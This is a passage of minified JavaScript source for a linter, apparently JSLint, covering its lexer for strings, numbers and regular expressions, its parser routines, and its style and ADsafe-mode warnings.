warn_at('control_a',line,character+pos,source_row.slice(0,pos));}else if(c===xquote){warn_at('bad_html',line,character+j);}else if(c==='<'){if(option.safe&&xmode==='html'){warn_at('adsafe_a',line,character+pos,c);}else if(source_row.charAt(pos+1)==='/'&&(xmode||option.safe)){warn_at('expected_a_b',line,character,'<\\/','</');}else if(source_row.charAt(pos+1)==='!'&&(xmode||option.safe)){warn_at('unexpected_a',line,character,'<!');}}else if(c==='\\'){if(xmode==='html'){if(option.safe){warn_at('adsafe_a',line,character+pos,c);}}else if(xmode==='styleproperty'){j+=1;character+=1;c=source_row.charAt(j);if(c!==x){warn_at('unexpected_a',line,character,'\\');}}else{j+=1;character+=1;c=source_row.charAt(j);switch(c){case'':if(!option.es5){warn_at('es5',line,character);}
next_line();j=-1;break;case xquote:warn_at('bad_html',line,character+j);break;case'\'':if(json_mode){warn_at('unexpected_a',line,character,'\\\'');}
break;case'u':hex(4);break;case'v':if(json_mode){warn_at('unexpected_a',line,character,'\\v');}
c='\v';break;case'x':if(json_mode){warn_at('unexpected_a',line,character,'\\x');}
hex(2);break;default:c=descapes[c];if(typeof c!=='string'){warn_at('unexpected_a',line,character,'\\');}}}}
r+=c;character+=1;j+=1;}}
function number(snippet){var digit;if(xmode!=='style'&&xmode!=='styleproperty'&&source_row.charAt(0).isAlpha()){warn_at('expected_space_a_b',line,character,c,source_row.charAt(0));}
if(c==='0'){digit=snippet.charAt(1);if(digit.isDigit()){if(token.id!=='.'&&xmode!=='styleproperty'){warn_at('unexpected_a',line,character,snippet);}}else if(json_mode&&(digit==='x'||digit==='X')){warn_at('unexpected_a',line,character,'0x');}}
if(snippet.slice(snippet.length-1)==='.'){warn_at('trailing_decimal_a',line,character,snippet);}
if(xmode!=='style'){digit=+snippet;if(!isFinite(digit)){warn_at('bad_number',line,character,snippet);}
snippet=digit;}
return it('(number)',snippet);}
function regexp(){var b,bit,captures=0,depth=0,flag,high,length=0,low,quote;for(;;){b=true;c=source_row.charAt(length);length+=1;switch(c){case'':stop_at('unclosed_regexp',line,from);return;case'/':if(depth>0){warn_at('unescaped_a',line,from+length,'/');}
c=source_row.slice(0,length-1);flag=Object.create(regexp_flag);while(flag[source_row.charAt(length)]===true){flag[source_row.charAt(length)]=false;length+=1;}
if(source_row.charAt(length).isAlpha()){stop_at('unexpected_a',line,from,source_row.charAt(length));}
character+=length;source_row=source_row.slice(length);quote=source_row.charAt(0);if(quote==='/'||quote==='*'){stop_at('confusing_regexp',line,from);}
return it('(regexp)',c);case'\\':c=source_row.charAt(length);if(c<' '){warn_at('control_a',line,from+length,String(c));}else if(c==='<'){warn_at(bundle.unexpected_a,line,from+length,'\\');}
length+=1;break;case'(':depth+=1;b=false;if(source_row.charAt(length)==='?'){length+=1;switch(source_row.charAt(length)){case':':case'=':case'!':length+=1;break;default:warn_at(bundle.expected_a_b,line,from+length,':',source_row.charAt(length));}}else{captures+=1;}
break;case'|':b=false;break;case')':if(depth===0){warn_at('unescaped_a',line,from+length,')');}else{depth-=1;}
break;case' ':pos=1;while(source_row.charAt(length)===' '){length+=1;pos+=1;}
if(pos>1){warn_at('use_braces',line,from+length,pos);}
break;case'[':c=source_row.charAt(length);if(c==='^'){length+=1;if(!option.regexp){warn_at('insecure_a',line,from+length,c);}else if(source_row.charAt(length)===']'){stop_at('unescaped_a',line,from+length,'^');}}
bit=false;if(c===']'){warn_at('empty_class',line,from+length-1);bit=true;}
klass:do{c=source_row.charAt(length);length+=1;switch(c){case'[':case'^':warn_at('unescaped_a',line,from+length,c);bit=true;break;case'-':if(bit){bit=false;}else{warn_at('unescaped_a',line,from+length,'-');bit=true;}
break;case']':if(!bit){warn_at('unescaped_a',line,from+length-1,'-');}
break klass;case'\\':c=source_row.charAt(length);if(c<' '){warn_at(bundle.control_a,line,from+length,String(c));}else if(c==='<'){warn_at(bundle.unexpected_a,line,from+length,'\\');}
length+=1;bit=true;break;case'/':warn_at('unescaped_a',line,from+length-1,'/');bit=true;break;case'<':if(xmode==='script'){c=source_row.charAt(length);if(c==='!'||c==='/'){warn_at(bundle.html_confusion_a,line,from+length,c);}}
bit=true;break;default:bit=true;}}while(c);break;case'.':if(!option.regexp){warn_at('insecure_a',line,from+length,c);}
break;case']':case'?':case'{':case'}':case'+':case'*':warn_at('unescaped_a',line,from+length,c);break;case'<':if(xmode==='script'){c=source_row.charAt(length);if(c==='!'||c==='/'){warn_at(bundle.html_confusion_a,line,from+length,c);}}
break;}
if(b){switch(source_row.charAt(length)){case'?':case'+':case'*':length+=1;if(source_row.charAt(length)==='?'){length+=1;}
break;case'{':length+=1;c=source_row.charAt(length);if(c<'0'||c>'9'){warn_at(bundle.expected_number_a,line,from+length,c);}
length+=1;low=+c;for(;;){c=source_row.charAt(length);if(c<'0'||c>'9'){break;}
length+=1;low=+c+(low*10);}
high=low;if(c===','){length+=1;high=Infinity;c=source_row.charAt(length);if(c>='0'&&c<='9'){length+=1;high=+c;for(;;){c=source_row.charAt(length);if(c<'0'||c>'9'){break;}
length+=1;high=+c+(high*10);}}}
if(source_row.charAt(length)!=='}'){warn_at(bundle.expected_a_b,line,from+length,'}',c);}else{length+=1;}
if(source_row.charAt(length)==='?'){length+=1;}
if(low>high){warn_at(bundle.not_greater,line,from+length,low,high);}
break;}}}
c=source_row.slice(0,length-1);character+=length;source_row=source_row.slice(length);return it('(regexp)',c);}
return{init:function(source){if(typeof source==='string'){lines=source.replace(crlfx,'\n').replace(crx,'\n').split('\n');}else{lines=source;}
line=0;next_line();from=1;},range:function(begin,end){var c,value='';from=character;if(source_row.charAt(0)!==begin){stop_at('expected_a_b',line,character,begin,source_row.charAt(0));}
for(;;){source_row=source_row.slice(1);character+=1;c=source_row.charAt(0);switch(c){case'':stop_at('missing_a',line,character,c);break;case end:source_row=source_row.slice(1);character+=1;return it('(range)',value);case xquote:case'\\':warn_at('unexpected_a',line,character,c);break;}
value+=c;}},token:function(){var c,i,quote,snippet;for(;;){while(!source_row){if(!next_line()){return it('(end)');}}
while(xmode==='outer'){i=source_row.search(ox);if(i===0){break;}else if(i>0){character+=1;source_row=source_row.slice(i);break;}else{if(!next_line()){return it('(end)','');}}}
snippet=match(rx[xmode]||tx);if(!snippet){snippet='';c='';while(source_row&&source_row<'!'){source_row=source_row.slice(1);}
if(source_row){if(xmode==='html'){return it('(error)',source_row.charAt(0));}else{stop_at('unexpected_a',line,character,source_row.charAt(0));}}}else{c=snippet.charAt(0);if(c.isAlpha()||c==='_'||c==='$'){return it('(identifier)',snippet);}
if(c.isDigit()){return number(snippet);}
switch(snippet){case'"':case"'":return string(snippet);case'//':collect_comment(source_row,'//',line,character);source_row='';break;case'/*':quote='/*';for(;;){i=source_row.search(lx);if(i>=0){break;}
collect_comment(source_row,quote,line,character);quote='';if(!next_line()){stop_at('unclosed_comment',line,character);}}
collect_comment(source_row.slice(0,i),quote,character,line);character+=i+2;if(source_row.charAt(i)==='/'){stop_at('nested_comment',line,character);}
source_row=source_row.slice(i+2);break;case'':break;case'/':if(token.id==='/='){stop_at(bundle.slash_equal,line,from);}
return prereg?regexp():it('(punctuator)',snippet);case'<!--':length=line;for(;;){i=source_row.indexOf('--');if(i>=0){break;}
i=source_row.indexOf('<!');if(i>=0){stop_at('nested_comment',line,character+i);}
if(!next_line()){stop_at('unclosed_comment',length,c);}}
length=source_row.indexOf('<!');if(length>=0&&length<i){stop_at('nested_comment',line,character+length);}
character+=i;if(source_row.charAt(i+2)!=='>'){stop_at('expected_a',line,character,'-->');}
character+=3;source_row=source_row.slice(i+3);break;case'#':if(xmode==='html'||xmode==='styleproperty'){for(;;){c=source_row.charAt(0);if((c<'0'||c>'9')&&(c<'a'||c>'f')&&(c<'A'||c>'F')){break;}
character+=1;source_row=source_row.slice(1);snippet+=c;}
if(snippet.length!==4&&snippet.length!==7){warn_at('bad_color_a',line,from+length,snippet);}
return it('(color)',snippet);}
return it('(punctuator)',snippet);default:if(xmode==='outer'&&c==='&'){character+=1;source_row=source_row.slice(1);for(;;){c=source_row.charAt(0);character+=1;source_row=source_row.slice(1);if(c===';'){break;}
if(!((c>='0'&&c<='9')||(c>='a'&&c<='z')||c==='#')){stop_at('bad_entity',line,from+length,character);}}
break;}
return it('(punctuator)',snippet);}}}}};}());function add_label(token,kind,name){name=name||token.value;if(funct===global_funct){if(option.safe){warn('adsafe_a',token,name);}
if(typeof global_funct[name]!=='string'){token.writeable=typeof predefined[name]==='boolean'?predefined[name]:true;token.funct=funct;global_scope[name]=token;}
if(kind==='becoming'){kind='var';}}else{if(typeof funct[name]==='string'){if(funct[name]==='undef'){if(!option.undef){warn('used_before_a',token,name);}
kind='var';}else{warn('already_defined',token,name);}}else{token.funct=funct;token.writeable=true;scope[name]=token;}}
funct[name]=kind;}
function peek(distance){var found,slot=0;distance=distance||0;while(slot<=distance){found=lookahead[slot];if(!found){found=lookahead[slot]=lex.token();}
slot+=1;}
return found;}
function discard(it){it=it||token;if(it.comments){var prev=it.prev;while(prev.comments===null){prev=prev.prev;}
if(prev.comments){prev.comments=prev.comments.concat(it.comments);}else{prev.comments=it.comments;}}
it.comments=null;}
function advance(id,match){if(indent){if(var_mode&&next_token.line!==token.line){if((var_mode!==indent||!next_token.edge)&&next_token.from===indent.at-
(next_token.edge?option.indent:0)){var dent=indent;for(;;){dent.at-=option.indent;if(dent===var_mode){break;}
dent=dent.was;}
dent.open=false;}
var_mode=null;}
if(indent.open){if(next_token.edge){if(next_token.edge==='label'){expected_at(1);}else if(next_token.edge==='case'){expected_at(indent.at-option.indent);}else if(indent.mode!=='array'||next_token.line!==token.line){expected_at(indent.at);}}else if(next_token.line!==token.line){if(next_token.from<indent.at+(indent.mode==='expression'?0:option.indent)){expected_at(indent.at+option.indent);}
indent.wrap=true;}}else if(next_token.line!==token.line){if(next_token.edge){expected_at(indent.at);}else{indent.wrap=true;if(indent.mode==='statement'||indent.mode==='var'){expected_at(indent.at+option.indent);}else if(next_token.from<indent.at+(indent.mode==='expression'?0:option.indent)){expected_at(indent.at+option.indent);}}}}
switch(token.id){case'(number)':if(next_token.id==='.'){warn('trailing_decimal_a');}
break;case'-':if(next_token.id==='-'||next_token.id==='--'){warn('confusing_a');}
break;case'+':if(next_token.id==='+'||next_token.id==='++'){warn('confusing_a');}
break;}
if(token.id==='(string)'||token.identifier){anonname=token.value;}
if(id&&next_token.id!==id){if(match){warn('expected_a_b_from_c_d',next_token,id,match.id,match.line,next_token.value);}else if(!next_token.identifier||next_token.value!==id){warn('expected_a_b',next_token,id,next_token.value);}}
prev_token=token;token=next_token;next_token=lookahead.shift()||lex.token();if(token.id==='(end)'){discard();}}
function do_safe(){if(option.adsafe){option.safe=true;}
if(option.safe){option.browser=option['continue']=option.css=option.debug=option.devel=option.evil=option.forin=option.newcap=option.nomen=option.on=option.rhino=option.sloppy=option.sub=option.undef=option.widget=option.windows=false;delete predefined.Array;delete predefined.Date;delete predefined.Function;delete predefined.Object;delete predefined['eval'];add_to_predefined({ADSAFE:false,lib:false});}}
function do_globals(){var name,writeable;for(;;){if(next_token.id!=='(string)'&&!next_token.identifier){return;}
name=next_token.value;advance();writeable=false;if(next_token.id===':'){advance(':');switch(next_token.id){case'true':writeable=predefined[name]!==false;advance('true');break;case'false':advance('false');break;default:stop('unexpected_a');}}
predefined[name]=writeable;if(next_token.id!==','){return;}
advance(',');}}
function do_jslint(){var name,value;while(next_token.id==='(string)'||next_token.identifier){name=next_token.value;advance();if(next_token.id!==':'){stop('expected_a_b',next_token,':',next_token.value);}
advance(':');switch(name){case'indent':value=+next_token.value;if(typeof value!=='number'||!isFinite(value)||value<0||Math.floor(value)!==value){stop('expected_small_a');}
option.indent=value;break;case'maxerr':value=+next_token.value;if(typeof value!=='number'||!isFinite(value)||value<=0||Math.floor(value)!==value){stop('expected_small_a',next_token);}
option.maxerr=value;break;case'maxlen':value=+next_token.value;if(typeof value!=='number'||!isFinite(value)||value<0||Math.floor(value)!==value){stop('expected_small_a');}
option.maxlen=value;break;default:if(next_token.id==='true'){option[name]=true;}else if(next_token.id==='false'){option[name]=false;}else{stop('unexpected_a');}
if(name==='adsafe'){option.adsafe=option.safe=true;do_safe();}else if(name==='safe'){do_safe();}}
advance();if(next_token.id===','){advance(',');}}
assume();}
function do_properties(){if(!properties){properties={};}
for(;;){if(next_token.id!=='(string)'&&!next_token.identifier){return;}
properties[next_token.value]=true;advance();if(next_token.id!==','){return;}
advance(',');}}
function directive(){var command=this.id,old_comments_off=comments_off;if(next_token.line===token.line&&next_token.from===token.thru){warn('missing_space_a_b',next_token,token.value,next_token.value);}
comments_off=true;option.white=true;if(lookahead.length>0||next_token.comments){warn('unexpected_a',this);}
switch(command){case'/*properties':case'/*property':case'/*members':case'/*member':do_properties();break;case'/*jslint':if(option.safe){warn('adsafe_a',this);}
do_jslint();break;case'/*globals':case'/*global':if(option.safe){warn('adsafe_a',this);}
do_globals();break;default:stop('unpexpected_a',this);}
comments_off=old_comments_off;advance('*/');}
function edge(mode){next_token.edge=!indent||(indent.open&&(mode||true));}
function step_in(mode){var open,was;if(typeof mode==='number'){indent={at:mode,open:true,was:was};}else if(!indent){indent={at:1,mode:'statement',open:true};}else{was=indent;open=mode==='var'||(next_token.line!==token.line&&mode!=='statement');indent={at:(open||mode==='control'?was.at+option.indent:was.at)+
(was.wrap?option.indent:0),mode:mode,open:open,was:was};if(mode==='var'&&open){var_mode=indent;}}}
function step_out(id,symbol){if(id){if(indent&&indent.open){indent.at-=option.indent;edge();}
advance(id,symbol);}
if(indent){indent=indent.was;}}
function one_space(left,right){left=left||token;right=right||next_token;if(right.id!=='(end)'&&!option.white&&(token.line!==right.line||token.thru+1!==right.from)){warn('expected_space_a_b',right,token.value,right.value);}}
function one_space_only(left,right){left=left||token;right=right||next_token;if(right.id!=='(end)'&&(left.line!==right.line||(!option.white&&left.thru+1!==right.from))){warn('expected_space_a_b',right,left.value,right.value);}}
function no_space(left,right){left=left||token;right=right||next_token;if((!option.white||xmode==='styleproperty'||xmode==='style')&&left.thru!==right.from&&left.line===right.line){warn('unexpected_space_a_b',right,left.value,right.value);}}
function no_space_only(left,right){left=left||token;right=right||next_token;if(right.id!=='(end)'&&(left.line!==right.line||(!option.white&&left.thru!==right.from))){warn('unexpected_space_a_b',right,left.value,right.value);}}
function spaces(left,right){if(!option.white){left=left||token;right=right||next_token;if(left.thru===right.from&&left.line===right.line){warn('missing_space_a_b',right,left.value,right.value);}}}
function comma(){if(next_token.id!==','){warn_at('expected_a_b',token.line,token.thru,',',next_token.value);}else{if(!option.white){no_space_only();}
advance(',');discard();spaces();}}
function semicolon(){if(next_token.id!==';'){warn_at('expected_a_b',token.line,token.thru,';',next_token.value);}else{if(!option.white){no_space_only();}
advance(';');discard();if(semicolon_coda[next_token.id]!==true){spaces();}}}
function use_strict(){if(next_token.value==='use strict'){if(strict_mode){warn('unnecessary_use');}
edge();advance();semicolon();strict_mode=true;option.newcap=false;option.undef=false;return true;}else{return false;}}
function are_similar(a,b){if(a===b){return true;}
if(Array.isArray(a)){if(Array.isArray(b)&&a.length===b.length){var i;for(i=0;i<a.length;i+=1){if(!are_similar(a[i],b[i])){return false;}}
return true;}
return false;}
if(Array.isArray(b)){return false;}
if(a.arity===b.arity&&a.value===b.value){switch(a.arity){case'prefix':case'suffix':case undefined:return a.id===b.id&&are_similar(a.first,b.first);case'infix':return are_similar(a.first,b.first)&&are_similar(a.second,b.second);case'ternary':return are_similar(a.first,b.first)&&are_similar(a.second,b.second)&&are_similar(a.third,b.third);case'function':case'regexp':return false;default:return true;}}else{if(a.id==='.'&&b.id==='['&&b.arity==='infix'){return a.second.value===b.second.value&&b.second.id==='(string)';}else if(a.id==='['&&a.arity==='infix'&&b.id==='.'){return a.second.value===b.second.value&&a.second.id==='(string)';}}
return false;}
function expression(rbp,initial){var left;if(next_token.id==='(end)'){stop('unexpected_a',token,next_token.id);}
advance();if(option.safe&&scope[token.value]&&scope[token.value]===global_scope[token.value]&&(next_token.id!=='('&&next_token.id!=='.')){warn('adsafe',token);}
if(initial){anonname='anonymous';funct['(verb)']=token.value;}
if(initial===true&&token.fud){left=token.fud();}else{if(token.nud){left=token.nud();}else{if(next_token.id==='(number)'&&token.id==='.'){warn('leading_decimal_a',token,next_token.value);advance();return token;}else{stop('expected_identifier_a',token,token.id);}}
while(rbp<next_token.lbp){advance();if(token.led){left=token.led(left);}else{stop('expected_operator_a',token,token.id);}}}
return left;}
function symbol(s,p){var x=syntax[s];if(!x||typeof x!=='object'){syntax[s]=x={id:s,lbp:p,value:s};}
return x;}
function delim(s){return symbol(s,0);}
function postscript(x){x.postscript=true;return x;}
function ultimate(s){var x=symbol(s,0);x.from=1;x.thru=1;x.line=0;x.edge=true;x.value=s;return postscript(x);}
function stmt(s,f){var x=delim(s);x.identifier=x.reserved=true;x.fud=f;return x;}
function labeled_stmt(s,f){var x=stmt(s,f);x.labeled=true;}
function disrupt_stmt(s,f){var x=stmt(s,f);x.disrupt=true;}
function reserve_name(x){var c=x.id.charAt(0);if((c>='a'&&c<='z')||(c>='A'&&c<='Z')){x.identifier=x.reserved=true;}
return x;}
function prefix(s,f,type){var x=symbol(s,150);reserve_name(x);x.nud=(typeof f==='function')?f:function(){if(s==='typeof'){one_space();}else{no_space_only();}
this.first=expression(150);this.arity='prefix';if(this.id==='++'||this.id==='--'){if(!option.plusplus){warn('unexpected_a',this);}else if((!this.first.identifier||this.first.reserved)&&this.first.id!=='.'&&this.first.id!=='['){warn('bad_operand',this);}}
this.type=type;return this;};return x;}
function type(s,t,nud){var x=delim(s);x.arity=x.type=t;if(nud){x.nud=nud;}
return x;}
function get_type(one){var a=(one.identifier&&scope[one.value])||one;return a&&a.type;}
function conform_type(one,two,three){var match='',one_type,two_type,one_token,two_token;if(typeof one==='string'){one_type=one;}else{one_token=(one.identifier&&scope[one.value])||one;one_type=one_token.type;}
two_token=(two.identifier&&scope[two.value])||two;two_type=two_token.type;if(one_type){if(two_type){if(one_type===two_type){match=one_type;}else{if(!option.type){warn('type_inconsistency_a_b',three||two,one_type,two_type);}}}else{two_token.type=match=one_type;}}else if(two_type){if(one_token){one_token.type=two_type;}
match=two_type;}
return match;}
function reserve(s,f){var x=delim(s);x.identifier=x.reserved=true;if(typeof f==='function'){x.nud=f;}
return x;}
function constant(name,type,value){var x=reserve(name);x.type=type;x.value=value;x.nud=return_this;return x;}
function reservevar(s,v){return reserve(s,function(){if(typeof v==='function'){v(this);}
return this;});}
function infix(s,p,f,type,w){var x=symbol(s,p);reserve_name(x);x.led=function(left){this.arity='infix';if(!w){spaces(prev_token,token);spaces();}
if(!option.bitwise&&this.bitwise){warn('unexpected_a',this);}
if(typeof f==='function'){return f(left,this);}else{this.first=left;this.second=expression(p);return this;}};if(type){x.type=type;}
return x;}
function expected_relation(node,message){if(node.assign){warn(message||bundle.conditional_assignment,node);}
return node;}
function expected_condition(node,message){switch(node.id){case'[':case'-':if(node.arity!=='infix'){warn(message||bundle.weird_condition,node);}
break;case'false':case'function':case'Infinity':case'NaN':case'null':case'true':case'undefined':case'void':case'(number)':case'(regexp)':case'(string)':case'{':warn(message||bundle.weird_condition,node);break;case'(':if(node.first.id==='.'&&numbery[node.first.second.value]===true){warn(message||bundle.weird_condition,node);}
break;}
return node;}
function check_relation(node){switch(node.arity){case'prefix':switch(node.id){case'{':case'[':warn('unexpected_a',node);break;case'!':warn('confusing_a',node);break;}
break;case'function':case'regexp':warn('unexpected_a',node);break;default:if(node.id==='NaN'){warn('isnan',node);}}
return node;}
function relation(s,eqeq){return infix(s,100,function(left,that){check_relation(left);if(eqeq&&!option.eqeq){warn('expected_a_b',that,eqeq,that.id);}
var right=expression(100);if(are_similar(left,right)||((left.id==='(string)'||left.id==='(number)')&&(right.id==='(string)'||right.id==='(number)'))){warn('weird_relation',that);}
that.first=left;that.second=check_relation(right);conform_type(left,that.second,that);return that;},'boolean');}
function assignop(s,op){var x=infix(s,20,function(left,that){var l;that.first=left;if(left.identifier){if(scope[left.value]){if(scope[left.value].writeable===false){warn('read_only',left);}}else{stop('read_only');}}else if(option.safe){l=left;do{if(typeof predefined[l.value]==='boolean'){warn('adsafe',l);}
l=l.first;}while(l);}
if(left===syntax['function']){warn('identifier_function',token);}
if(left.id==='.'||left.id==='['){if(!left.first||left.first.value==='arguments'){warn('bad_assignment',that);}
that.second=expression(19);if(that.id==='='&&are_similar(that.first,that.second)){warn('weird_assignment',that);}}else if(left.identifier&&!left.reserved){if(funct[left.value]==='exception'){warn('assign_exception',left);}
that.second=expression(19);if(that.id==='='&&are_similar(that.first,that.second)){warn('weird_assignment',that);}
if(that.type){conform_type(left,that);conform_type(that,that.second,that);}else{conform_type(left,that.second,that);}}
return that;});x.assign=true;if(op){if(syntax[op].type){x.type=syntax[op].type;}
if(syntax[op].bitwise){x.bitwise=true;}}
return x;}
function bitwise(s,p){var x=infix(s,p,'number');x.bitwise=true;return x;}
function suffix(s){var x=symbol(s,150);x.led=function(left){no_space_only(prev_token,token);if(!option.plusplus){warn('unexpected_a',this);}else if((!left.identifier||left.reserved)&&left.id!=='.'&&left.id!=='['){warn('bad_operand',this);}
this.first=left;this.arity='suffix';return this;};return x;}
function optional_identifier(){if(next_token.identifier){advance();if(option.safe&&banned[token.value]){warn('adsafe_a',token);}else if(token.reserved&&!option.es5){warn('expected_identifier_a_reserved',token);}
return token.value;}}
function identifier(){return optional_identifier();}
function statement(){var label,old_scope=scope,the_statement;if(next_token.id===';'){warn('unexpected_a');semicolon();return;}
if(next_token.identifier&&!next_token.reserved&&peek().id===':'){edge('label');label=next_token;advance();discard();advance(':');discard();scope=Object.create(old_scope);add_label(label,'label');if(next_token.labeled!==true){warn('label_a_b',next_token,label.value,next_token.value);}else if(jx.test(label.value+':')){warn('url',label);}else if(funct===global_funct){stop('unexpected_a',token);}
next_token.label=label;}
edge();step_in('statement');the_statement=expression(0,true);if(the_statement){if(the_statement.arity==='statement'){if(the_statement.id==='switch'||(the_statement.block&&the_statement.id!=='do')){spaces();}else{semicolon();}}else{if(the_statement.id==='('){if(the_statement.first.id==='new'){warn('bad_new');}}else if(!the_statement.assign&&the_statement.id!=='delete'&&the_statement.id!=='++'&&the_statement.id!=='--'){warn('assignment_function_expression',token);}
semicolon();}}
step_out();scope=old_scope;return the_statement;}
function statements(){var array=[],disruptor,the_statement;while(next_token.postscript!==true){if(next_token.id===';'){warn('unexpected_a',next_token);semicolon();}else{if(next_token.value==='use strict'){if(!node_js||funct!==global_funct||array.length>0){warn('function_strict');}
use_strict();}
if(disruptor){warn('unreachable_a_b',next_token,next_token.value,disruptor.value);disruptor=null;}
the_statement=statement();if(the_statement){array.push(the_statement);if(the_statement.disrupt){disruptor=the_statement;array.disrupt=true;}}}}
return array;}
function block(ordinary){var array,curly=next_token,old_inblock=in_block,old_scope=scope,old_strict_mode=strict_mode;in_block=ordinary;scope=Object.create(scope);spaces();if(next_token.id==='{'){advance('{');step_in();if(!ordinary&&!use_strict()&&!old_strict_mode&&!option.sloppy&&funct['(context)']===global_funct){warn('missing_use_strict');}
array=statements();strict_mode=old_strict_mode;step_out('}',curly);discard();}else if(!ordinary){stop('expected_a_b',next_token,'{',next_token.value);}else{warn('expected_a_b',next_token,'{',next_token.value);array=[statement()];array.disrupt=array[0].disrupt;}
funct['(verb)']=null;scope=old_scope;in_block=old_inblock;if(ordinary&&array.length===0){warn('empty_block');}
return array;}
function tally_property(name){if(properties&&typeof properties[name]!=='boolean'){warn('unexpected_property_a',token,name);}
if(typeof member[name]==='number'){member[name]+=1;}else{member[name]=1;}}
syntax['(identifier)']={lbp:0,identifier:true,nud:function(){var name=this.value,variable=scope[name],site,writeable;if(typeof variable!=='object'){writeable=predefined[name];if(typeof writeable==='boolean'){global_scope[name]=variable={value:name,writeable:writeable,funct:global_funct};global_funct[name]='var';}else{if(!option.undef){warn('used_before_a',token);}
scope[name]=variable={value:name,writeable:true,funct:funct};funct[name]='undef';}}
site=variable.funct;if(funct===site){switch(funct[name]){case'becoming':warn('unexpected_a',token);funct[name]='var';break;case'unused':funct[name]='var';break;case'unparam':funct[name]='parameter';break;case'unction':funct[name]='function';break;case'label':warn('a_label',token,name);break;}}else{switch(funct[name]){case'closure':case'function':case'var':case'unused':warn('a_scope',token,name);break;case'label':warn('a_label',token,name);break;case'outer':case'global':break;default:switch(site[name]){case'function':case'unction':case'var':case'unused':case'becoming':case'closure':case'parameter':site[name]='closure';funct[name]=site===global_funct?'global':'outer';break;case'unparam':site[name]='parameter';funct[name]='outer';break;case'undef':funct[name]='undef';break;case'label':warn('a_label',token,name);break;}}}
return this;},led:function(){stop('expected_operator_a');}};type('(array)','array');type('(color)','color');type('(function)','function');type('(number)','number',return_this);type('(object)','object');type('(string)','string',return_this);type('(boolean)','boolean',return_this);type('(range)','range');type('(regexp)','regexp',return_this);ultimate('(begin)');ultimate('(end)');ultimate('(error)');postscript(delim('</'));delim('<!');delim('<!--');delim('-->');postscript(delim('}'));delim(')');delim(']');postscript(delim('"'));postscript(delim('\''));delim(';');delim(':');delim(',');delim('#');delim('@');delim('*/');postscript(reserve('case'));reserve('catch');postscript(reserve('default'));reserve('else');reserve('finally');reservevar('arguments',function(x){if(strict_mode&&funct===global_funct){warn('strict',x);}else if(option.safe){warn('adsafe',x);}});reservevar('eval',function(x){if(option.safe){warn('adsafe',x);}});constant('false','boolean',false);constant('Infinity','number',Infinity);constant('NaN','number',NaN);constant('null','',null);reservevar('this',function(x){if(strict_mode&&((funct['(statement)']&&funct['(name)'].charAt(0)>'Z')||funct===global_funct)){warn('strict',x);}else if(option.safe){warn('adsafe',x);}});constant('true','boolean',true);constant('undefined','',undefined);infix('?',30,function(left,that){that.first=expected_condition(expected_relation(left));that.second=expression(0);spaces();var colon=next_token;advance(':');discard();spaces();that.third=expression(10);that.arity='ternary';that.type=conform_type(that.second,that.third);if(are_similar(that.second,that.third)){warn('weird_ternary',colon);}else if(are_similar(that.first,that.second)){warn('use_or',that);}
return that;});infix('||',40,function(left,that){function paren_check(that){if(that.id==='&&'&&!that.paren){warn('and',that);}
return that;}
that.first=paren_check(expected_condition(expected_relation(left)));that.second=paren_check(expected_relation(expression(40)));if(are_similar(that.first,that.second)){warn('weird_condition',that);}
return that;});infix('&&',50,function(left,that){that.first=expected_condition(expected_relation(left));that.second=expected_relation(expression(50));if(are_similar(that.first,that.second)){warn('weird_condition',that);}
return that;});prefix('void',function(){this.first=expression(0);if(this.first.id!=='(number)'||this.first.value){warn('unexpected_a',this);return this;}
this.type='undefined';return this;});bitwise('|',70);bitwise('^',80);bitwise('&',90);relation('==','===');relation('===');relation('!=','!==');relation('!==');relation('<');relation('>');relation('<=');relation('>=');bitwise('<<',120);bitwise('>>',120);bitwise('>>>',120);infix('in',120,function(left,that){warn('infix_in',that);that.left=left;that.right=expression(130);return that;},'boolean');infix('instanceof',120,null,'boolean');infix('+',130,function(left,that){if(!left.value){if(left.id==='(number)'){warn('unexpected_a',left);}else if(left.id==='(string)'){warn('expected_a_b',left,'String','\'\'');}}
var right=expression(130);if(!right.value){if(right.id==='(number)'){warn('unexpected_a',right);}else if(right.id==='(string)'){warn('expected_a_b',right,'String','\'\'');}}
if(left.id===right.id&&(left.id==='(string)'||left.id==='(number)')){left.value+=right.value;left.thru=right.thru;if(left.id==='(string)'&&jx.test(left.value)){warn('url',left);}
discard(right);discard(that);return left;}
that.first=left;that.second=right;that.type=conform_type(left,right,that);return that;});prefix('+','num');prefix('+++',function(){warn('confusing_a',token);this.first=expression(150);this.arity='prefix';return this;});infix('+++',130,function(left){warn('confusing_a',token);this.first=left;this.second=expression(130);return this;});infix('-',130,function(left,that){if((left.id==='(number)'&&left.value===0)||left.id==='(string)'){warn('unexpected_a',left);}
var right=expression(130);if((right.id==='(number)'&&right.value===0)||right.id==='(string)'){warn('unexpected_a',left);}
if(left.id===right.id&&left.id==='(number)'){left.value-=right.value;left.thru=right.thru;discard(right);discard(that);return left;}
that.first=left;that.second=right;return that;},'number');prefix('-');prefix('---',function(){warn('confusing_a',token);this.first=expression(150);this.arity='prefix';return this;});infix('---',130,function(left){warn('confusing_a',token);this.first=left;this.second=expression(130);return this;});infix('*',140,function(left,that){if((left.id==='(number)'&&(left.value===0||left.value===1))||left.id==='(string)'){warn('unexpected_a',left);}
var right=expression(140);if((right.id==='(number)'&&(right.value===0||right.value===1))||right.id==='(string)'){warn('unexpected_a',right);}
if(left.id===right.id&&left.id==='(number)'){left.value*=right.value;left.thru=right.thru;discard(right);discard(that);return left;}
that.first=left;that.second=right;return that;},'number');infix('/',140,function(left,that){if((left.id==='(number)'&&left.value===0)||left.id==='(string)'){warn('unexpected_a',left);}
var right=expression(140);if((right.id==='(number)'&&(right.value===0||right.value===1))||right.id==='(string)'){warn('unexpected_a',right);}
if(left.id===right.id&&left.id==='(number)'){left.value/=right.value;left.thru=right.thru;discard(right);discard(that);return left;}
that.first=left;that.second=right;return that;},'number');infix('%',140,function(left,that){if((left.id==='(number)'&&(left.value===0||left.value===1))||left.id==='(string)'){warn('unexpected_a',left);}
var right=expression(140);if((right.id==='(number)'&&right.value===0)||right.id==='(string)'){warn('unexpected_a',right);}
if(left.id===right.id&&left.id==='(number)'){left.value%=right.value;left.thru=right.thru;discard(right);discard(that);return left;}
that.first=left;that.second=right;return that;},'number');suffix('++');prefix('++');suffix('--');prefix('--');prefix('delete',function(){one_space();var p=expression(0);if(!p||(p.id!=='.'&&p.id!=='[')){warn('deleted');}
this.first=p;return this;});prefix('~',function(){no_space_only();if(!option.bitwise){warn('unexpected_a',this);}
expression(150);return this;},'number');prefix('!',function(){no_space_only();this.first=expected_condition(expression(150));this.arity='prefix';if(bang[this.first.id]===true){warn('confusing_a',this);}
